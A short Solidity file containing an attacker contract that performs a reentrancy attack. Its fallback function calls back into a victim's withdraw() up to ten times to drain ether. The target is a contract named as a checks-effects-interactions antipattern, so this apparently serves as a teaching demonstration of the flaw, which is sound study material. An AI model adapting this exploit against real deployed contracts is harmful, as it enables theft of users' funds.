pragma solidity ^0.7.0;

import './ChecksEffectsInteractionsAntipattern.sol';

contract Attacker {
  ChecksEffectsInteractionsAntipattern v;
  uint256 public count;
  address public victims_address;

  event LogFallback(uint c, uint balance);

  constructor (ChecksEffectsInteractionsAntipattern victim) {
    victims_address = address(victim);
    v = ChecksEffectsInteractionsAntipattern(victim);
  }

  function set_balance () public {
    uint _amount;
    _amount = 1 ether;
     victims_address.call{value: _amount}("");
  }

  function attack () public {
    v.withdraw();
  }

  fallback () external payable {
    count++;
    emit LogFallback(count, address(this).balance);
    if (count < 10) {
      v.withdraw();
    } 
  }
}